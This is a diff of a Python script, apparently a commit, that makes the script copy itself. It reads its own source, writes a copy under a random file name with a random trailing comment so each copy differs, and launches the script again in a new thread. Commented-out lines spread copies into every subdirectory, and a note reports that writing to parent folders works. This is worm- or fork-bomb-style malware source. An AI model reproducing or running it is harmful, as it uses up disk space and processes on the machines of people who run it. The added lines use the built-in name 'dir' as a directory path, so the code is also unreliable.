@@ -27,9 +27,11 @@ def writeIntoFile(file, lines):
             break
         file.write(line)
 
+directory = os.getcwd()
+thisfile = os.path.basename(__file__)
 
-def runFuncv(filename):
-    os.system('python3 ' + filename)
+def runFuncv():
+    os.system('python3 .\\' + thisfile)
 
 
 # get the current file
@@ -53,21 +55,36 @@ def create_file(dir):
     return filename
 
 
+
+
+
+
+
+f = open(thisfile, "r")
+lines = f.readlines()
+f.close()
+
+filename = "{randomness}.py".format(
+        randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
+
+i = open(dir + "\\" + filename, "w")
+writeIntoFile(i, lines)
+i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+i.close()
+
 # Create the new file in current dir and run
-# thread = Thread(target=runFuncv, args=[".\\" + create_file(".\\")])
-# thread.start()
+thread = Thread(target=runFuncv)
+thread.start()
 
-
-directory = os.getcwd()
 # walk to subdirs
-for x in os.walk(directory):
-    if x[0] == os.getcwd():
-        continue
+#for x in os.walk(directory):
+#    if x[0] == os.getcwd():
+#        continue
     # Create the new file and include a different name
-    filename = create_file(x[0])
+#    filename = create_file(x[0])
 
-    thread = Thread(target=runFuncv, args=[x[0] + "\\" + filename])
-    thread.start()
+#    thread = Thread(target=runFuncv, args=[x[0] + "\\" + filename])
+#    thread.start()
 
 
 # Working: Write to parent folders
